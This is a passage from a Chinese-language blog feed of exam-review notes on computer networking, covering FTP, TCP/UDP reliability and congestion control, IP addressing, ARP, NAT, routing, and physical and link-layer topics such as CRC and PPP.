Transfer Protocol)</h1><ul><li>提供交互式的访问<h2 id="工作步骤"><a href="#工作步骤" class="headerlink" title="工作步骤"></a>工作步骤</h2></li><li>打开熟知端口(端口号为 21),使客户进程能够连接上。</li><li>等待客户进程发出连接请求。</li><li>启动从属进程来处理客户进程发来的请求。</li><li>回到等待状态,继续接受其他客户进程发来的请求。<h2 id="控制连接和数据连接"><a href="#控制连接和数据连接" class="headerlink" title="控制连接和数据连接"></a>控制连接和数据连接</h2>控制连接在整个会话期间一直保持打开，实际用于传输文件的是“数据连接”<h1 id="超媒体超文本"><a href="#超媒体超文本" class="headerlink" title="超媒体超文本"></a>超媒体超文本</h1></li></ul>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理运输层复习</title>
      <link href="/2019/01/06/2019-01-06-%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
      <url>/2019/01/06/2019-01-06-%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测</p><a id="more"></a><ul><li>用户数据报协议 UDP</li><li>传输控制协议 TCP</li><li>可靠传输的工作原理</li><li>TCP 报文段的首部格式</li><li>TCP 的流量控制、拥塞控制</li><li>TCP 的运输连接管理</li></ul><hr><h1 id="TCP-UDP"><a href="#TCP-UDP" class="headerlink" title="TCP  UDP"></a>TCP  UDP</h1><ul><li>传输的数据单位：运输协议数据单元 TPDU (Transport Protocol Data Unit)</li></ul><h2 id="用户数据报协议UDP-User-Datagram-Protocol"><a href="#用户数据报协议UDP-User-Datagram-Protocol" class="headerlink" title="用户数据报协议UDP (User Datagram Protocol)"></a>用户数据报协议UDP (User Datagram Protocol)</h2><ul><li><strong>无连接</strong> </li><li>├── 在传送数据之前不需要先建立连接</li><li>├── 对方的运输层在收到 UDP 报文后,不需要给出任何确认。</li><li>└── 不提供可靠交付<br>与IP数据报的区别：IP需要经过存储转发过程、UDP在运输层的端到端（进程）的逻辑信道中传送，只比IP数据报服务多了</li><li>复用分用</li><li>差错检测<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3></li><li>UDP 是无连接的,发送数据之前不需要建立连接,因此减少了开销和发送数据之前的时延</li><li>UDP 使用尽最大努力交付,即不保证可靠交付</li><li>UDP 是面向报文的,UDP 一次交付一个完整的报文。</li><li>UDP 没有拥塞控制</li><li>UDP 支持一对一、一对多、多对一和多对多的交互通信,全双工</li><li>UDP 的首部开销小,<strong>只有 8 个字节</strong>,比TCP 的 20 个字节的首部要短。<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/UDP.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="传输控制协议-TCP-Transmission-Control-Protocol"><a href="#传输控制协议-TCP-Transmission-Control-Protocol" class="headerlink" title="传输控制协议 TCP (Transmission Control Protocol)"></a>传输控制协议 TCP (Transmission Control Protocol)</h2></li><li>面向连接的运输层协议</li><li>TCP 连接只能有两个端点</li><li>提供可靠交付</li><li>提供全双工通信</li><li>面向字节流<h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3>根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节<br>(UDP 发送的报文长度是应用进程给出的)</li></ul><h2 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h2><ul><li><p>停止等待协议</p></li><li><p>连续ARQ协议</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发送方维持的发送窗口,它的意义是:</span><br><span class="line">位于发送窗口内的分组都可连续发送出去,而不需要等待对方的确认。</span><br><span class="line">这样,信道利用率就提高了。</span><br><span class="line">连续 ARQ 协议规定,发送方每收到一个确认,就把发送窗口向前滑动一个分组的位置。</span><br><span class="line"></span><br><span class="line">接收方一般采用累积确认的方式。</span><br><span class="line">即不必对收到的分组逐个发送确认,而是对按序到达的最</span><br><span class="line">后一个分组发送确认,</span><br><span class="line">这样就表示:到这个分组为止的所有分组都已正确收到了。</span><br></pre></td></tr></table></figure></li><li><p>确认丢失<strong>不必重传</strong></p></li><li><p>不能向发送方反映出接收方已经正确收到的所有分组的信息</p><h3 id="GBN重传"><a href="#GBN重传" class="headerlink" title="GBN重传"></a>GBN重传</h3></li><li><p>可以在连续收到好几个正确的确认帧后，才对最后一个数据帧发确认信息</p></li><li><p>这就是说，对某一数据帧的确认就表明该数据帧和这以前所有的数据帧均已正确无误地收到了。</p></li><li><p>后退N帧协议的接受窗口为1，可以保证按序接受数据帧。若采用n个比特对帧编号，则其发送窗口的尺寸Wt应满足：1&lt;=Wt&lt;=2^n-1</p></li><li><p>ACK(n+1)表示对第n号帧的确认，表明接受方已正确收到第n帧及以前的所有帧</p><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>数据链路层采用了后退N帧(GBN)协议，发送方已经发送了编号为0～7的帧。当计时器超时时，若发送方只收到0、2、3号帧的确认，则发送方需要重发的帧数是( )。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：根据后退N帧协议，接收方的窗口为“<span class="number">1</span>”，如果发送方收到了<span class="number">3</span>号帧的确认，则说明<span class="number">0</span>、<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>号帧都已经发送成功，所以只需要重发<span class="number">4</span>、<span class="number">5</span>、<span class="number">6</span>、<span class="number">7</span>号帧即可。</span><br></pre></td></tr></table></figure></li></ul><h2 id="TCP可靠重传"><a href="#TCP可靠重传" class="headerlink" title="TCP可靠重传"></a>TCP可靠重传</h2><ul><li>字节为单位的滑动窗口 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">发送缓存：存放①发送应用程序传送给发送方 TCP 准备发送的数据</span><br><span class="line">        ②TCP 已发送出但尚未收到确认的数据</span><br><span class="line">* 超时重传时间</span><br><span class="line">* 选择确认SACK</span><br><span class="line">## TCP流量控制</span><br><span class="line">出现拥塞的原因:</span><br><span class="line">∑对资源需求 &gt; 可用资源</span><br><span class="line"></span><br><span class="line">* 增加资源不能解决拥塞，重传也不行，反而可能加剧</span><br><span class="line">* 拥塞控制：为了防止过多数据注入到网络中，一个全局性的过程</span><br><span class="line">* 流量控制：点对通信量的控制，一个端到端的过程，抑制发送端发送数据的速率,以便使接收端来得及接收</span><br><span class="line">开环控制、闭环控制。</span><br><span class="line">### tcp拥塞控制方法（闭环控制</span><br><span class="line">TCP发送方维持一个拥塞窗口 CWND(Congestion Window)</span><br><span class="line">*判断方式 有两个：*</span><br><span class="line">* 使用**重传定时器**定时，若超时，重传；</span><br><span class="line">* 收到三个重复的ACK</span><br><span class="line">算法有四种，慢开始，&lt;blue&gt;拥塞避免&lt;/blue&gt;、快重传、快恢复</span><br><span class="line">* 拥塞窗口 cwnd 设置：最大报文段 SMSS 窗口数值</span><br><span class="line">* 慢开始门限 ssthresh(状态变量):防止拥塞窗口cwnd 增长过大引起网络拥塞。</span><br></pre></td></tr></table></figure></li></ul><p>当 cwnd &lt; ssthresh 时,使用慢开始算法。<br>当 cwnd &gt; ssthresh 时,停止使用慢开始算法而改<br>用拥塞避免算法。<br>当 cwnd = ssthresh 时,既可使用慢开始算法,也<br>可使用拥塞避免算法。</p><pre><code>* 3ACK  拥塞避免，变成一半，然后拥塞避免，线性增加* 超时  cwnd=1，慢开始，从1开始增加### 快重传：让发送方尽早知道发生了个别报文段的丢失发送方只要一连收到三个重复确认,就知道接收方确实没有收到报文段,因而应当立即进行重传(即“快重传”),这样就不会出现超时,发送方也不就会误认为出现了网络拥塞{% image /img/FN.png '' '' %}## TCP三次握手发送链接请求报文段* A ---------------------------------------- B* A发请求报文段，同步位SYN=1，选择序号seq=x表示第一个数据字节的序号为x* B发确认报文段，同步位SYN=1，确认位ACK=1，确认号ack=x+1，自己的数据序号seq=y* A发确认报文段，确认位ACK=1，数据序号seq=x+1，确认号ack=y+1发送链接释放报文段* A ---------------------------------------- B* A发请求报文段，FIN=1，选择序号seq=u* B发确认报文段，ACK=1，确认号ack=u+1，数据序号seq=v，A半关闭* B发确认报文段，FIN=1，ACK=1，确认号ack=u+1，数据序号seq=w* A发确认报文段，ACK=1，确认号ack=w+1，数据序号seq=u+1，A关闭**其中，A 必须等待 2MSL 的时间*** 保证 A 发送的最后一个 ACK 报文段能够到达 B。* A 在发送完最后一个 ACK 报文段后,再经过时间 2MSL,就可以使本连接持续的时间内所产生的所有报文段,都从网络中消失。这样就可以使下一个新的连接中不会出现这种旧的连接请求报文段。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理网络层复习</title>
      <link href="/2019/01/05/2019-01-05-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%A4%8D%E4%B9%A0/"/>
      <url>/2019/01/05/2019-01-05-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>限于IP层</p><a id="more"></a><p>网络层向运输层提供的服务</p><h2 id="面向连接-无连接"><a href="#面向连接-无连接" class="headerlink" title="面向连接  无连接"></a>面向连接  无连接</h2><h1 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 地址解析协议 ARP(Address Resolution Protocol)** </span><br><span class="line">* 网际控制报文协议 ICMP(Internet Control Message Protocol)**</span><br><span class="line">* 网际组管理协议 IGMP(Internet Group Management Protocol)**</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPands.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p><strong>互联时使用中间设备</strong></p><ul><li>物理层中继系统:转发器 (repeater)。</li><li>数据链路层中继系统:网桥 或 桥接器 (bridge)。</li><li>网络层中继系统:路由器 (router)。</li><li>网桥和路由器的混合物:桥路器 (brouter)。</li><li>网络层以上的中继系统:网关 (gateway)。<h2 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h2></li><li><em>A B C三类*</em><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络号|主机号  一共<span class="number">32</span>位</span><br><span class="line">IPv6 <span class="number">128</span>位</span><br><span class="line">IP 地址 ::= &#123; &lt;网络号&gt;, &lt;主机号&gt;&#125;</span><br><span class="line">A类地址 <span class="number">8</span> ，<span class="number">24</span> [最大可指派网络<span class="number">126</span> (<span class="number">2</span>^<span class="number">7</span> -<span class="number">1</span> -<span class="number">1</span>)]</span><br><span class="line">B类地址 <span class="number">16</span>，<span class="number">16</span> [最大可指派网络(<span class="number">2</span>^<span class="number">14</span> -<span class="number">1</span> -<span class="number">1</span>)]</span><br><span class="line">C类地址 <span class="number">24</span>, <span class="number">8</span>  [最大可指派网络(<span class="number">2</span>^<span class="number">21</span> -<span class="number">1</span> -<span class="number">1</span>)]</span><br></pre></td></tr></table></figure></li></ul><p>IP地址与硬件地址报文、数据帧的区别</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPandHard.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="其他分类方式"><a href="#其他分类方式" class="headerlink" title="其他分类方式"></a>其他分类方式</h3><ul><li><p>子网划分</p></li><li><p>构成超网</p><h2 id="ARP协议-解决同一个局域网的主机或路由器的IP：MAC问题"><a href="#ARP协议-解决同一个局域网的主机或路由器的IP：MAC问题" class="headerlink" title="ARP协议,解决同一个局域网的主机或路由器的IP：MAC问题"></a>ARP协议,解决同一个局域网的主机或路由器的IP：MAC问题</h2></li><li><p>不管网络层使用的是什么协议,在实际网络的链路上传送数据帧时,最终还是必须使用<strong>硬件地址</strong>。</p></li><li><p>ARP 高速缓存 (ARPcache),里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。<br>格式 &lt; IP address;MAC address;TTL &gt; TTL (Time To Live):地址映射有效时间 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">存放最近获得的 IP 地址到 MAC 地址的绑定,以减少 ARP 广播的数量。</span><br><span class="line">为了减少网络上的通信量,主机 A 在发送其ARP请求分组时,就将自己的 IP 地址</span><br><span class="line">到硬件地址的映射写入 ARP 请求分组。</span><br><span class="line">当主机 B 收到 A 的 ARP 请求分组时,就将主机 A的这一地址映射写入</span><br><span class="line">主机 B 自己的 ARP高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。</span><br></pre></td></tr></table></figure></li><li><p>ARP请求分组<br>包含发送方硬件地址 / 发送方IP 地址/目标方硬件地址(未知时填 0)/ 目标方IP 地址。</p></li><li><p>本地广播 ARP 请求</p></li><li><p>ARP 响应分组 包含发送方硬件地址/发送方IP地址/目标方硬件地址/目标方 IP 地址。</p></li></ul><h2 id="IP数据报分片"><a href="#IP数据报分片" class="headerlink" title="IP数据报分片"></a>IP数据报分片</h2><p>数据报字段格式</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPziduan.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>转发过程：根据IP数据报的目的地址就可以确定下一跳路由器<br>分组转发算法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 从数据报的首部提取目的主机的 IP 地址 D, 得出目的网络地址为 N。</span><br><span class="line">(<span class="number">2</span>) 若网络 N 与此路由器直接相连,则把数据报直接交付目的主机D;</span><br><span class="line">否则是间接交付,执行(<span class="number">3</span>)。</span><br><span class="line">(<span class="number">3</span>) 若路由表中有目的地址为 D 的特定主机路由,则把数据报传送给</span><br><span class="line">路由表中所指明的下一跳路由器;否则,执行(<span class="number">4</span>)。</span><br><span class="line">(<span class="number">4</span>) 若路由表中有到达网络 N 的路由,则把数据报传送给路由表指</span><br><span class="line">明的下一跳路由器;否则,执行(<span class="number">5</span>)。</span><br><span class="line">(<span class="number">5</span>) 若路由表中有一个默认路由,则把数据报传送给路由表中所指</span><br><span class="line">明的默认路由器;否则,执行(<span class="number">6</span>)。</span><br><span class="line">(<span class="number">6</span>) 报告转发分组出错。</span><br></pre></td></tr></table></figure></li></ul><h2 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h2><p>从 主机号借用几位 划分子网号</p><ul><li>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}<br>与上述转发过程不同点：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)路由器在收到 IP 数据报后,再按目的网络号 net-id 和子网号 subnet-id 找到目的子网</span><br><span class="line"><span class="number">2</span>)通过子网掩码与IP地址进行&amp;操作，匹配，则说明子网掩码代表的这个子网就是目的网络。</span><br></pre></td></tr></table></figure></li></ul><h2 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h2><ul><li>无分类编址 CIDR，IP地址 ::= {&lt;网络前缀&gt;, &lt;主机号&gt;},中间使用符号‘/’来表示网络前缀<h3 id="构成超网"><a href="#构成超网" class="headerlink" title="构成超网"></a>构成超网</h3>路由聚合 有利于减少路由器之间选择的次数，从而提高性能。</li><li>CIDR记法 0 可以省略</li></ul><h3 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h3><p><strong>原因</strong>：使用 CIDR 时,路由表中的每个项目由“网络前缀”和“下一跳地址”组成。<br>在查找路由表时可能会得到不止一个匹配结果<br><strong>方案</strong>：在匹配结果中选择最长网络前缀的路由。</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><ul><li>报文格式</li><li>ICMP首部检验和<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/ICMP.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h2></li><li>内部网关协议　RIP   ———|</li><li>内部网关协议　OSPF  ———|–IGP</li><li>外部网关协议  BGP 将路由选择协议传递到另一个自制系统中<br>使用4种报文<br>打开 更新 保活 keepalive  通知 notification</li></ul><p>RIP<br>(1)仅和相邻路由器交换信息。<br>(2)交换的信息是当前本路由器所知道的全部信息,即自己的路由表。<br>(3)按固定的时间间隔交换路由信息,例如,每隔30秒。<br>当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息。</p><h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><ul><li><p>在 IPv6 数据报要进入IPv4网络时,把 IPv6 数据报封装成为 IPv4 数据报,<br>整个的 IPv6 数据报变成了 IPv4 数据报的数据部分。</p></li><li><p>当 IPv4 数据报离开 IPv4 网络中的隧道时,再把数据部分(即原来的 IPv6 数据报)<br>交给主机的 IPv6 协议栈。</p></li></ul><h2 id="NAT技术-网络地址转换-Network-Address-Translation"><a href="#NAT技术-网络地址转换-Network-Address-Translation" class="headerlink" title="NAT技术 网络地址转换(Network Address Translation)"></a>NAT技术 网络地址转换(Network Address Translation)</h2><p><strong>解决</strong>：在专用网上使用专用地址的主机如何与互联网上的主机通信(并不需要加密)的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">内部主机 A 用本地地址 IP A 和互联网上主机 B 通信所</span><br><span class="line">发送的数据报必须经过 NAT 路由器。</span><br><span class="line"></span><br><span class="line">NAT 路由器将数据报的源地址 IP A 转换成全球地址IP G ,</span><br><span class="line">并把转换结果记录到NAT地址转换表中,目的地址 IP B 保持不变,然后发送到互联网。</span><br><span class="line"></span><br><span class="line">NAT 路由器收到主机 B 发回的数据报时,知道数据报中的源地址是 IP B 而目的地址是 IP G 。</span><br><span class="line"></span><br><span class="line">根据 NAT 转换表,NAT 路由器将目的地址 IP G 转换为IP A ,转发给最终的内部主机 A。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理物理层链路层复习</title>
      <link href="/2019/01/05/2019-01-05-%E7%89%A9%E7%90%86%E5%B1%82%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2019/01/05/2019-01-05-%E7%89%A9%E7%90%86%E5%B1%82%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>限于物理层、链路层 </p><a id="more"></a><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h2 id="屏蔽双绞线-STP-Shielded-Twisted-Pair"><a href="#屏蔽双绞线-STP-Shielded-Twisted-Pair" class="headerlink" title="屏蔽双绞线 STP (Shielded Twisted Pair)"></a>屏蔽双绞线 STP (Shielded Twisted Pair)</h2><h2 id="无屏蔽双绞线-UTP-Unshielded-Twisted-Pair"><a href="#无屏蔽双绞线-UTP-Unshielded-Twisted-Pair" class="headerlink" title="无屏蔽双绞线 UTP (Unshielded Twisted Pair)"></a>无屏蔽双绞线 UTP (Unshielded Twisted Pair)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">室内传送数据的无屏蔽双绞线和屏蔽双绞线的标准 EIA/TIA-568。</span><br></pre></td></tr></table></figure><h2 id="多模光纤"><a href="#多模光纤" class="headerlink" title="多模光纤"></a>多模光纤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以存在多条不同角度入射的光线在一条光纤中传输。</span><br><span class="line">这种光纤就称为多模光纤。</span><br></pre></td></tr></table></figure><h2 id="单模光纤"><a href="#单模光纤" class="headerlink" title="单模光纤"></a>单模光纤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，</span><br><span class="line">它可使光线一直向前传播，而不会产生多次反射,这样的光纤称为单模光纤</span><br></pre></td></tr></table></figure><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1) 通信容量非常大。</span><br><span class="line">(2) 传输损耗小，中继距离长。</span><br><span class="line">(2) 抗雷电和电磁干扰性能好。</span><br><span class="line">(3) 无串音干扰，保密性好。</span><br><span class="line">(4) 体积小，重量轻。</span><br><span class="line">TIPS:光纤应用于：**企业网络 FTTH 和访问网络 长途网络 水下网络**</span><br></pre></td></tr></table></figure><h3 id="自由空间称为“非导引型传输媒体”。"><a href="#自由空间称为“非导引型传输媒体”。" class="headerlink" title="自由空间称为“非导引型传输媒体”。"></a>自由空间称为“非导引型传输媒体”。</h3><p><strong>短波通信（即高频通信）</strong>主要是靠【电离层】的反射，但短波信道的通信质量较差，<br>传输速率低微波在空间主要是直线传播</p><p><strong>传统微波</strong>：地面微波接力通信 、卫星通信</p><p><strong>宽带接入技术</strong>：有线宽带接入 无线宽带接入</p><h2 id="非对称数字用户线-ADSL-Asymmetric-Digital-Subscriber-Line-技术"><a href="#非对称数字用户线-ADSL-Asymmetric-Digital-Subscriber-Line-技术" class="headerlink" title="非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术"></a>非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务</span><br><span class="line">特点：上行和下行带宽做成不对称的(上行指从用户到 ISP，而下行指从 ISP 到用户)。</span><br><span class="line">ADSL 在用户线（铜线）的两端各安装一个ADSL 调制解调器。</span><br><span class="line">我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。</span><br><span class="line">（这里的“多音调”就是【“多载波”或“多子信道”】的意思。</span><br><span class="line"></span><br><span class="line">DMT 调制技术采用【频分复用】的方法</span><br><span class="line">ADSL 采用【自适应调制技术】使用户线能够传送尽可能高的数据率，但【不能保证固定的数据率】</span><br><span class="line">第二代ADSL【无缝速率自适应技术 SRA (Seamless Rate Adaptation)】HFC网使用【模拟光纤技术】</span><br><span class="line">【电缆调制解调器】是为【 HFC 网】而使用的调制解调器</span><br></pre></td></tr></table></figure><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><h2 id="链路层使用的信道-点对点信道、广播信道"><a href="#链路层使用的信道-点对点信道、广播信道" class="headerlink" title="链路层使用的信道 :点对点信道、广播信道"></a>链路层使用的信道 :点对点信道、广播信道</h2><p><strong>链路&lt;通路</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据（逻辑）链路 (data link) 除了【物理线路】外，还必须有【通信协议】来控制这些数据的传输。</span><br><span class="line">若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。</span><br><span class="line">现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。</span><br><span class="line">一般的适配器都包括了【数据链路层和物理层】这两层的功能。</span><br></pre></td></tr></table></figure><h2 id="数据链路层协议要解决的基本问题"><a href="#数据链路层协议要解决的基本问题" class="headerlink" title="数据链路层协议要解决的基本问题"></a>数据链路层协议要解决的基本问题</h2><p>【封装成帧】【透明传输】【差错控制】</p><p>①<strong>封装成帧</strong>，在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。<br>作用：确定帧的界限【帧定界】。—帧定界符SOH_DATA_EOT（end of transmission）</p><p>②<strong>透明传输</strong>：如果数据中的某个字节的二进制代码恰好和SOH或EOT一样<br>数据链路层就会错误地“找到帧的边界”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解决方法：【字节填充 (byte stuffing)】或【字符填充(character stuffing)】。</span><br><span class="line">1发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面</span><br><span class="line">插入一个转义字符“ESC”(其十六进制编码是 1B)。</span><br><span class="line">2接收端的数据链路层在将数据送往网络层之前删除插入的转义字符</span><br><span class="line">3如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。</span><br><span class="line">当接收端收到连续的两个转义字符时，就删除其中前面的一个</span><br></pre></td></tr></table></figure><p>③<strong>差错检测</strong>：在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1<br>在一段时间内，传输错误的比特占所传输比特总数的比率称为【误码率 BER (Bit Error Rate)】。</p><h2 id="循环冗余检验CRC"><a href="#循环冗余检验CRC" class="headerlink" title="循环冗余检验CRC"></a>循环冗余检验CRC</h2><p>计算冗余码，余数作为FCS【帧检验序列】</p><ul><li>CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 </li><li>FCS 可以用 CRC 这种方法得出，但 CRC 并不是获得 FCS 的唯一方法</li><li>“无比特差错”与“无传输差错”是不同的概念。</li></ul><p>(1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受 (accept)。</p><p>(2) 若余数 R！=0，则判定这个帧有差错，就丢弃。<br>数据链路层的CRC检验可以实现【无比特差错】，</p><ul><li>但是【不可靠传输】【不能确定是哪个比特出了差错】，只能做到【无差错接受】（无比特差错）<br>要做到“可靠传输”（即发送什么就收到什么）就必须再加上【确认和重传机制】</li></ul><h2 id="PROTOCAL-PPP-Point-to-Point-Protocol-协议】点对点协议（包含了物理层和ip层的内容）"><a href="#PROTOCAL-PPP-Point-to-Point-Protocol-协议】点对点协议（包含了物理层和ip层的内容）" class="headerlink" title="PROTOCAL PPP(Point-to-Point Protocol)协议】点对点协议（包含了物理层和ip层的内容）"></a>PROTOCAL PPP(Point-to-Point Protocol)协议】点对点协议（包含了物理层和ip层的内容）</h2><ul><li>【面向字节，以字节为单位】</li><li>【一个将 IP 数据报封装到串行链路的方法】</li><li>【链路控制协议 LCP (Link Control Protocol)】</li><li>【网络控制协议 NCP (Network Control Protocol)】</li><li>【同步传输时，采用硬件完成【比特填充】，零比特传输：五个连续的1就填入一个0，接收时删除】</li><li>【异步传输时，使用特殊的字符填充法】<br>MAC帧格式<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/mac.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul><h2 id="PROTOCAL-CSMA-CD"><a href="#PROTOCAL-CSMA-CD" class="headerlink" title="PROTOCAL CSMA/CD"></a>PROTOCAL CSMA/CD</h2><p>局域网具有如下主要优点：</p><ul><li>【具有广播功能】，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。</li><li>【便于系统的扩展和逐渐地演变】，各设备的位置可灵活调整和改变。</li><li>【提高了系统的可靠性、可用性、残存性】</li></ul>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dijstra</title>
      <link href="/2018/12/11/2018-12-11-dijstra/"/>
      <url>/2018/12/11/2018-12-11-dijstra/</url>
      
